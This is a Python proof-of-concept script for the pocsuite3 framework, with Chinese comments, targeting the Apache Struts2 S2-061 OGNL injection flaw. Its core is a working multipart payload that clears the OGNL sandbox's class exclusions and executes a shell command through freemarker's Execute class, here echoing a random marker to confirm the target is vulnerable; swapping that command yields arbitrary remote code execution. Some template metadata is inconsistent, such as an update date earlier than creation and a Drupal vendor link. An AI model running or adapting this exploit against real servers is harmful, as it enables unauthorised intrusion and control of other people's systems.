#!/usr/bin/python3
# -*- coding: utf-8 -*-
# @Time    : 2021/6/12 23:51
# @Author  : ox400
# @Email   : ox01024@163.com
# @File    : Struts2_S2-061_rce.py

from pocsuite3.api \
    import Output,POCBase,POC_CATEGORY,register_poc,requests,VUL_TYPE,get_listener_ip,get_listener_port
from pocsuite3.lib.core.interpreter_option \
    import OptString,OptDict,OptIP,OptPort,OptBool,OptInteger,OptFloat,OptItems
from pocsuite3.modules.listener \
    import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str

class DemoPOC(POCBase):
    vulID='0001'
    version='1'
    author='0x400'
    vulDate='2021-06-12'
    createDate = '2021-06-12'       # 编写 PoC 的日期
    updateDate = '2014-10-16'       # PoC 更新的时间,默认和编写时间一样
    references = ['https://vulhub.org/#/environments/struts2/s2-061/']      # 漏洞地址来源,0day不用写
    name = 'Struts2 S2-061 Remote Code Execution PoC'   # PoC 名称
    appPowerLink = 'https://www.drupal.org/'    # 漏洞厂商主页地址
    appName = 'Struts2'          # 漏洞应用名称
    appVersion = '2.5.25'          # 漏洞影响版本
    vulType = VUL_TYPE.COMMAND_EXECUTION      # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = []                # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []       # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = '''
            Struts2 会对某些标签属性(比如 `id`，其他属性有待寻找) 的属性值进行二次表达式解析，
            因此当这些标签属性中使用了 `%{x}` 且 `x` 的值用户可控时，用户再传入一个 `%{payload}` 
            即可造成OGNL表达式执行。S2-061是对S2-059沙盒进行的绕过。
        '''  # 漏洞简要描述
    pocDesc = ''' 
            poc的用法描述 
        '''  # POC用法描述


    def _check(self,url,flag = random_str(8)):
        # 随机生成8位字符串
        payload = "\r\n\r\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n%{(#instancemanager=#application[\"org.apache.tomcat.InstanceManager\"]).(#stack=#attr[\"com.opensymphony.xwork2.util.ValueStack.ValueStack\"]).(#bean=#instancemanager.newInstance(\"org.apache.commons.collections.BeanMap\")).(#bean.setBean(#stack)).(#context=#bean.get(\"context\")).(#bean.setBean(#context)).(#macc=#bean.get(\"memberAccess\")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(\"java.util.HashSet\")).(#bean.put(\"excludedClasses\",#emptyset)).(#bean.put(\"excludedPackageNames\",#emptyset)).(#arglist=#instancemanager.newInstance(\"java.util.ArrayList\")).(#arglist.add(\""
        payload += f'echo {flag}'
        payload += "\")).(#execute=#instancemanager.newInstance(\"freemarker.template.utility.Execute\")).(#execute.exec(#arglist))}\r\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF--"

        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Accept-Language': 'en',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36',
            'Connection': 'close',
            'Content-Type': 'multipart/form-data;boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF',
            'Content-Length': '834',
            'Cookie': 'JSESSIONID=node09dzt5vx4dssltq860tgsevtl26.node0'
        }
        r=requests.post(url,data=payload, headers=headers)
        # 当flag 标识存在于返回包 则存在漏洞
        if flag in r.text:
            return url,headers,payload,'/'
        return False

    def _verify(self):
        '''
        验证模式 将url传入_check方法
        接受返回 URL and Postdata,Path
        '''
        result={}
        p=self._check(self.url)
        if p:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = p[0]
            result['VerifyInfo']['headers'] = p[1]
            result['VerifyInfo']['Postdata'] = p[2]
            result['VerifyInfo']['Path'] = p[3]
        # 的parse_output通用结果处理函数对_verify和_attack结果进行处理。
        return self.parse_output(result)
    def _attack(self):
        return self._verify()



    def parse_output(self, result):
        output = Output(self)
        if result:
            # 输出调用成功信息
            output.success(result)
        else:
            # 输出调用失败
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)

